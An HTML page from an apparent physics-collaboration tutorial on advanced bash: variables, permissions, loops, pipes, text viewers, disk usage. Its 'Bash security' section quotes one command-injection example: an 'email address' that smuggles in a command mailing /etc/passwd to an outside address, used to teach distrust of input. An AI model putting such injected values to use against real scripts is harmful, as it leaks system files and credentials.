@@ -1,0 +1,518 @@
+<!DOCTYPE HTML>
+<html lang="en" >
+    
+    <head>
+        
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>Advanced shell topics | LHCb analysis essentials</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 2.6.4">
+        
+        
+        <meta name="HandheldFriendly" content="true"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+        <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+        
+    <link rel="stylesheet" href="../gitbook/style.css">
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-katex/katex.min.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-highlight/website.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-search/search.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-fontsettings/website.css">
+        
+    
+    
+        <link rel="stylesheet" href="../css/website.css">
+    
+
+        
+    
+    
+    <link rel="next" href="../git/git.html" />
+    
+    
+    <link rel="prev" href="../shell/persistent-screen.html" />
+    
+
+        
+    </head>
+    <body>
+        
+        
+    <div class="book"
+        data-level="1.4"
+        data-chapter-title="Advanced shell topics"
+        data-filepath="shell/shell2.md"
+        data-basepath=".."
+        data-revision="Wed Dec 02 2015 13:33:04 GMT+0000 (UTC)"
+        data-innerlanguage="">
+    
+
+<div class="book-summary">
+    <nav role="navigation">
+        <ul class="summary">
+            
+            
+            
+            
+
+            
+
+            
+    
+        <li class="chapter " data-level="0" data-path="index.html">
+            
+                
+                    <a href="../index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                        Introduction
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1" data-path="shell/shell.html">
+            
+                
+                    <a href="../shell/shell.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.</b>
+                        
+                        Shell
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1" data-path="shell/screen.html">
+            
+                
+                    <a href="../shell/screen.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.</b>
+                        
+                        Using screen to keep things running
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="shell/screen2.html">
+            
+                
+                    <a href="../shell/screen2.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.2.</b>
+                        
+                        Advanced screen topics
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="shell/persistent-screen.html">
+            
+                
+                    <a href="../shell/persistent-screen.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.3.</b>
+                        
+                        Persistent screen or tmux session
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4" data-path="shell/shell2.html">
+            
+                
+                    <a href="../shell/shell2.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.4.</b>
+                        
+                        Advanced shell topics
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2" data-path="git/git.html">
+            
+                
+                    <a href="../git/git.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.</b>
+                        
+                        Version control with Git
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1" data-path="git/basics.html">
+            
+                
+                    <a href="../git/basics.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.1.</b>
+                        
+                        Basics
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="git/gitlab.html">
+            
+                
+                    <a href="../git/gitlab.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.2.</b>
+                        
+                        CERN Gitlab
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+
+            
+            <li class="divider"></li>
+            <li>
+                <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+                    Published with GitBook
+                </a>
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+
+    <div class="book-body">
+        <div class="body-inner">
+            <div class="book-header" role="navigation">
+    <!-- Actions Left -->
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../" >LHCb analysis essentials</a>
+    </h1>
+</div>
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                
+                
+                    <section class="normal" id="section-">
+                    
+                        <h1 id="more-about-the-unix-shell">More about the UNIX shell</h1>
+<h2 id="types-of-shell">Types of shell</h2>
+<p>Several shells are available, the most common ones being probably <code>bash</code> and <code>tcsh</code>.
+In this tutorial, we will always refer to the <code>bash</code> shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!
+To check the type of shell we are using we can type <code>echo</code> to display the value of the <code>$0</code> environment variable:</p>
+<p><code>echo $0</code></p>
+<p>which, if the shell in use is <code>bash</code>, returns</p>
+<pre><code>-bash
+</code></pre><h2 id="manual-pages">Manual pages</h2>
+<p>Each command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the <code>man</code> command, for example:</p>
+<pre><code class="lang-man">man ls
+</code></pre>
+<p>But what if we are looking for a command, but don&#x2019;t know or don&#x2019;t remember its name?
+In this case it might be useful to use the <code>apropos</code> command.
+For example, if we want to list the contents of a directory, we could look for something like</p>
+<p><code>apropos &#x201C;list directory&#x201D;</code></p>
+<p>which will return a list of (possibly) relevant commands, together with their descriptions.
+In this particular case:</p>
+<pre><code>dir                  (1)  - list directory contents
+gfal-ls              (1)  - list directory contents or file information
+ls                   (1)  - list directory contents
+ls                   (1p)  - list directory contents
+vdir                 (1)  - list directory contents
+</code></pre><h2 id="environment-variables">Environment variables</h2>
+<p>In addition to <code>0</code>, some other common examples of environment variables are <code>EDITOR</code>, <code>PATH</code>, and <code>LD_LIBRARY_PATH</code>, whose value can be displayed by</p>
+<pre><code>echo $EDITOR
+echo $PATH
+echo $LD_LIBRARY_PATH
+</code></pre><p>In particular, the <code>PATH</code> variable specifies in which directories programs can be found (for example, if we type <code>ls</code>, the command <code>ls</code> is searched for in such directories), while the <code>LD_LIBRARY_PATH</code> variable specifies where shared libraries are located.
+Environment variables can be exported with</p>
+<pre><code>export VARNAME=value
+</code></pre><p>This can be done from the command line or from within a <code>bash</code> script.
+For example, let&apos;s create a <code>bash</code> script named <code>StarWars.sh</code>, having the following lines:</p>
+<pre><code>#!/bin/bash
+echo &#x201C;Hello Star Wars&apos; world!&#x201D;
+export CHARACTER=&#x201C;Anakin&#x201D;
+</code></pre><p>After saving and closing, we can run it from the shell with</p>
+<pre><code>bash StarWars.sh
+</code></pre><p>or with</p>
+<pre><code>./StarWars.sh
+</code></pre><p>the latter after changing the file permissions with <code>chmod u+x StarWars.sh</code>, so that the script can actually be executed.
+The file permissions tell us who is allowed to do what to a given file or directory.
+There are three basic <a href="http://linuxcommand.org/lts0070.php" target="_blank">permission types</a> (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).
+The owner and the group can be managed by the <a href="http://www.linfo.org/chown.html" target="_blank"><code>chown</code></a> and <a href="http://www.computerhope.com/unix/uchgrp.htm" target="_blank"><code>chgrp</code></a> commands.</p>
+<p>What happens if we now write <code>echo $CHARACTER</code> in the terminal? Can you explain why?</p>
+<h3 id="lets-now-try-the-following-callout">Let&apos;s now try the following: {.callout}</h3>
+<pre><code>source StarWars.sh
+</code></pre><p>or, equivalently:</p>
+<pre><code>. StarWars.sh
+</code></pre><p>and then</p>
+<pre><code>./StarWars.sh
+echo $CHARACTER
+</code></pre><p>Is there any difference?</p>
+<p><code>Exercise (5 min):</code> Change the file permissions so that your friends can read, write, and execute (or not) the <code>StarWars.sh</code> shell script and try to set their Star Wars character to something you like.</p>
+<h2 id="variables">Variables</h2>
+<p>In <code>bash</code>, variables are usually interpreted as strings.
+However, we can do integer arithmetic using the <code>let</code> keyword. Let&apos;s add to <code>StarWars.sh</code> the following lines:</p>
+<pre><code>A=1
+B=2
+strvar=$A+$B
+let intvar=$A+$B
+echo &quot;strvar is ${strvar}, intvar is ${intvar}&quot;
+</code></pre><p>What can you notice?</p>
+<h2 id="differences-among-files">Differences among files</h2>
+<p>The <code>diff</code> command is used to compare files line by line.
+To simply check for differing files:</p>
+<p><code>diff -q file1.dat file2.dat</code></p>
+<p>To show the output in two columns and suppress the common lines:</p>
+<p><code>diff -y &#x2014;suppress-common-lines file1.dat file2.dat</code></p>
+<p>To show the unified diff:</p>
+<p><code>diff -u file1.dat file2.dat</code></p>
+<h2 id="looping-over-files">Looping over files</h2>
+<p>In bash, loops have the following syntax:</p>
+<pre><code>for VARIABLE in LIST
+do
+  &lt;something&gt;
+done
+</code></pre><p>if the loop has to be repeated a fixed number of times, or:</p>
+<pre><code>while [ EXPRESSION ]
+do
+  &lt;something&gt;
+done
+</code></pre><p>if the loop has to be repeated until a condition is fulfilled.</p>
+<h2 id="conditionals">Conditionals</h2>
+<p>Conditionals have the following syntax:</p>
+<pre><code>if [ COND1 ]
+then
+    echo &#x201C;COND1 evaluated to true&#x201D;
+elif [COND2 ]
+then
+    echo &#x201C;COND2 evaluated to true&#x201D;
+else
+    echo &#x201C;Test not passed&#x201D;
+fi
+</code></pre><p><code>Exercise (5 min):</code> Create a text file and then write a script that checks whether the text file</p>
+<ul>
+<li>exists;</li>
+<li>is readable;</li>
+<li>is newer than another text file.</li>
+</ul>
+<p><code>Exercise (5 min):</code> In the <code>StarWars.sh</code> script, add some lines to check whether</p>
+<ul>
+<li><code>A</code> is equal to <code>B</code>;</li>
+<li><code>A</code> is smaller than <code>B</code>;</li>
+<li><code>A</code> is larger than <code>B</code>.
+Be careful! We might be tempted to use <code>&gt;</code> and <code>&lt;</code> inside the shell script, but they actually havea a different meaning for the shell, so <code>lt</code> and <code>gt</code> should be used instead.</li>
+</ul>
+<h2 id="linking-commands">Linking commands</h2>
+<p>Let us consider the three following lines, in which we link the commands to list the files in the <code>Poems</code> and <code>Recipes</code> folders through the <code>;</code>, <code>&amp;&amp;</code>, or <code>||</code> operators:</p>
+<pre><code>ls Poems/*.txt; ls Recipes/*.txt 
+ls Poems/*.txt &amp;&amp; ls Recipes/*.txt 
+ls Poems/*.txt || ls Recipes/*.txt
+</code></pre><p>The <code>;</code> means execute the first, then the second; the <code>&amp;&amp;</code> means execute the first, then the second if the first was successful, while the <code>||</code> means execute the first, then the second if the first was not successful.</p>
+<h2 id="pipes-and-redirection">Pipes and redirection</h2>
+<p>We already saw how to chain commands together, for example using the pipe to redirect the output of a command to a file or to feed it to another command.</p>
+<p><code>Exercise (5 min)</code>: Save in a file the lines containing the word &#x201C;force&#x201D; searching for them in all the files in the <code>Material/StarWars</code> folder.</p>
+<p>Solution:</p>
+<pre><code>files=`ls StarWars/*.txt`
+for file in $files; do grep &#x2014;color -w &#x201C;force&#x201D; $file &gt;&gt; Sentences.dat; done
+</code></pre><p><code>Exercise (5 min):</code> Now do the same, but searching for a string provided by the user.</p>
+<p>Solution:</p>
+<p>There are two ways to supply inputs to a shell script.</p>
+<p>Open <code>StarWars.sh</code> and add the following lines</p>
+<pre><code>files=`ls StarWars/*.txt`
+echo &#x201C;Enter the string to be looked for&#x2026;&#x201D;
+read string
+echo &#x201C;Looking for: ${string}&#x201D;
+for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences2.dat; done
+</code></pre><p>Another solution is to replace the lines above with</p>
+<pre><code>files=`ls StarWars/*.txt`
+string=$1
+echo &#x201C;Looking for: ${string}&#x201D;
+for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences2.dat; done
+</code></pre><p>where command line arguments are used, and run again with</p>
+<pre><code>. StarWars.sh
+</code></pre><p>and</p>
+<pre><code>. StarWars.sh force
+</code></pre><p>It must be noticed that the first argument is saved in the <code>$1</code> variable. What is, then, <code>$0</code>? This is the name of the shell script! And what is <code>$#</code>? This is the number of parameters!</p>
+<p>What happens if we do not provide any argument?
+We need to check that the string has been assigned, which can be done by adding</p>
+<pre><code>if [ -n &#x201C;${string}&#x201D; ]
+then
+    for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences.dat; done
+else
+    echo &#x201C;No string provided.&#x201D;
+    return
+fi
+</code></pre><p>What happens if we use <code>exit</code> instead of <code>return</code>?</p>
+<p>Another useful command worth mentioning is <code>tee</code>, which allows to save the output into a file, but also to show it on the stdout (our screen):</p>
+<p><code>ls Poems/*.txt | tee ListOfFilesWithTee.dat</code></p>
+<p>If we want to append to the output file, we can use the <code>-a</code> option:</p>
+<p><code>ls Poems/*.txt | tee -a ListOfFilesWithTee.dat</code></p>
+<h2 id="bash-security">Bash security</h2>
+<p><a href="http://i.stack.imgur.com/MI1tR.jpg" target="_blank">Situations that can turn very wrong very quickly</a>, which means it is important to be aware of potentially dangerous behaviours.</p>
+<p>It is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.
+Some examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.</p>
+<p>One practical example, provided by Sebastian Lopienski, is the following: let&apos;s say we wrote a script that sends emails using the <code>mail</code> command:</p>
+<p><code>cat confirmation.txt | mail $email</code></p>
+<p>and someone provides the following email address:</p>
+<p><code>me@fake.com; cat /etc/passwd | mail me@real.com</code></p>
+<p>So, what do we get?</p>
+<pre><code>cat confirmation.txt | mail me@fake.com;
+cat /etc/passwd | mail me@real.com
+</code></pre><p>Great!</p>
+<h2 id="complexity">Complexity</h2>
+<p>Bash is great until a certain level of complexity is reached&#x2026;so try to keep it simple!
+What about <a href="http://lhcb-release-area.web.cern.ch/LHCb-release-area/DOC/online/releases/v4r65/doxygen/df/dd9/src_2_lineshape_maker_8cpp__incl.png" target="_blank">this</a>?</p>
+<h2 id="text-viewers">Text viewers</h2>
+<p>The <code>less</code> command, which is the improved version of an earlier program, called <code>more</code>, is used to read but not edit text files.
+It allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.
+Up and down arrows (or <code>j</code> and <code>k</code>) allow to scroll through the text file, line by line, while <code>Ctrl+f</code> and <code>Ctrl+b</code> allow to scroll through the text file, page by page.
+To go to a specific line, it is possible to type the number of the line and then press <code>G</code>.
+To search for a string forward, press <code>/</code> and then type the string.
+To search for a string backward, press <code>?</code> and then type the string.
+To quit, press <code>q</code>.</p>
+<p>The <code>cat</code> command is even simpler than <code>less</code>, since it just outputs the contents of one or more files to the standard output.</p>
+<pre><code>cat file.dat
+cat file1.dat file2.dat
+</code></pre><p>But it is very powerful when linking commands!</p>
+<p>Finally, the <code>head</code>/<code>tail</code> commands print the first(last) n lines of a given file:</p>
+<pre><code>head -n 2 file.dat
+head -n 2 file1.dat file2.dat
+</code></pre><h2 id="text-editors">Text editors</h2>
+<p>Text editors allow not only to read, but also to modify the contents of a text file.
+There are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:</p>
+<ul>
+<li><code>vim</code> or simply <code>vi</code> </li>
+<li><code>emacs</code></li>
+<li><code>nano</code></li>
+<li><code>gedit</code></li>
+</ul>
+<h2 id="disk-space">Disk space</h2>
+<p>At some point we all need to check how much space we are using.
+For doing that, we can use the <code>df</code> and <code>du</code> commands.
+The <code>df</code> command displays the disk usage and remaining free space on all currently mounted devices:</p>
+<pre><code>df
+</code></pre><p>We can specify the option <code>-h</code> to convert to human readable units (kB, MB, GB, &#x2026;):</p>
+<pre><code>df -h
+</code></pre><p>and a directory, if we want to inspect only that:</p>
+<pre><code>df -h directory
+</code></pre><p>The <code>du</code> command is similar to <code>df</code>, but goes recursively in all subdirectories of the present working directory:</p>
+<pre><code>du
+</code></pre><p>If the option <code>-s</code> is specified,</p>
+<pre><code>du -s
+</code></pre><p>it checks the present working directory only. As for <code>df</code>, the <code>-h</code> option allows to have human readable units.
+Another interesting option is</p>
+<pre><code>du &#x2014;max-depth=N
+</code></pre><p>which allows to go <code>N</code> directories deep.</p>
+<h2 id="over-the-wire-and-bandit-wargame">Over the Wire and Bandit wargame</h2>
+<p>And to conclude...let&apos;s start a 20 min wargame on <a href="http://overthewire.org/wargames/bandit/" target="_blank">Over the Wire</a> and compete to earn a delicious cold beer to be served soon after the session itself!</p>
+<p>Bandit is a wargame aimed at absolute beginners.
+It is organised in levels, each level requiring to having completed the previous one. Don&#x2019;t panic if you have no clue how to proceed:</p>
+<pre><code>- try using the manual, by typing man &lt;command&gt; (even man has a man) and then type q to quit the manual pages;
+- for shell built-in commands, try with help &lt;command&gt;;
+- ask Google or your favourite search engine!
+</code></pre>
+                    
+                    </section>
+                
+                
+                </div>
+            </div>
+        </div>
+
+        
+        <a href="../shell/persistent-screen.html" class="navigation navigation-prev " aria-label="Previous page: Persistent screen or tmux session"><i class="fa fa-angle-left"></i></a>
+        
+        
+        <a href="../git/git.html" class="navigation navigation-next " aria-label="Next page: Version control with Git"><i class="fa fa-angle-right"></i></a>
+        
+    </div>
+</div>
+
+        
+<script src="../gitbook/app.js"></script>
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-search/lunr.min.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-search/search.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-sharing/buttons.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-fontsettings/buttons.js"></script>
+    
+
+<script>
+require(["gitbook"], function(gitbook) {
+    var config = {"katex":{},"highlight":{},"search":{"maxIndexSize":1000000},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2}};
+    gitbook.start(config);
+});
+</script>
+
+        
+    </body>
+    
+</html>
